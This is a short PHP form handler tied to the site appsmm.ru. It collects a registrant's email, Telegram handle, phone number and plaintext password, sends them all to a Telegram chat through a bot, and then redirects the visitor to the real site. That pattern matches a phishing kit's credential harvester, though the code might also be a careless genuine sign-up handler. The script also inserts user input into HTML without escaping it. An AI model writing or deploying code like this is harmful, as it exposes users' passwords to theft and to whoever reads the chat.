<?php
include_once 'app/TelegramBotService.php';

if ($_SERVER["REQUEST_METHOD"] == "POST" || $_SERVER["REQUEST_METHOD"] == "GET") {
    $email = $_POST["email"] ?? null;
    $telegram = $_POST["telegram"] ?? null;
    $phone = $_POST["phone"] ?? null;
    $password = $_POST["password"] ?? null;
    $role = $_POST["role"] ?? null;
    $site = 'appsmm.ru';


    $message = "<b>AppSmm</b> \n";
    $message .= "<b>Форма регистрации</b> \n";
    $message .= "Сайт: <b>$site</b> \n";
    $message .= "Email: <b>$email</b> \n";
    $message .= "Telegram: <b>$telegram</b> \n";
    $message .= "Телефон: <b>$phone</b> \n";
    $message .= "Пароль: <b>$password</b> \n";
    $message .= "Роль в сервисе: <b>$role</b> \n";
    $message .= "Дата: " . "<b>" . date('Y-m-d H:i:s') . "</b>";


    $telegram = new TelegramBotService();
    $send = $telegram->sendMessage($message, ['parse_mode' => 'HTML']);


    $jsonData = json_encode(['status' => true]);
    header('Content-Type: application/json');

    header('Location: '. 'https://appsmm.ru');
}


?>


